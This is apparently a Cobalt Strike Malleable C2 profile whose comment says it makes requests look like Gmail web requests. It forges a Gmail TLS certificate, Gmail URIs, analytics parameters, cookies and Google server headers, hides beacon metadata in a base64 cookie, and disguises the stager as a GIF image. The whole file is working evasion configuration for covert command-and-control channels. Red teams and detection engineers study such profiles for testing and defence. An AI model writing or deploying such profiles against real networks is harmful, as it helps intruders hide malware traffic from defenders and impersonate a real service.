# Make requests look like GMail web requests
#
# Author: @ChrisTruncer

https-certificate {
	set CN       "gmail.com";
	set O        "Google's GMail";
	set C        "US";
	set L        "Mountain View";
	set OU       "Google Mail";
	set ST       "CA";
	set validity "365";
}

http-get {
	set uri "/mail/u/1/";
	client {
		header "Content-Type" "application/octet-stream";

		metadata {
			base64;
			prepend "OSID=";
			header "Cookie";
		}

		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";

	}

	server {
		header "X-Content-Type-Options" "nosniff";
		header "X-Frame-Options" "SAMEORIGIN";
		header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
		header "X-XSS-Protection" "1; mode=block";
		header "Server" "GSE";
		output{
			print;
		}
	}
}

http-post {
	set uri "/mail/u/0/";
	client {
		parameter "ui" "d3244c4707";
		parameter "hop" "6928632";
		parameter "start" "0";
		parameter "ver" "CYIddE5Mgok.en.";
		header "Cookie" "GMAIL_AT=pg6bC3PF8o4j54nzDfTVMI65mmmyL4eaGZ;";

		id {
            parameter "rid";
        }

        output{
        	print;
        }
	}

	server {
		header "X-Content-Type-Options" "nosniff";
		header "X-Frame-Options" "SAMEORIGIN";
		header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
		header "X-XSS-Protection" "1; mode=block";
		header "Server" "GSE";

		output {
			print;
		}

	}
}

# dress up the staging process too
http-stager {
	server {
		header "Content-Type" "image/gif";
	}
}
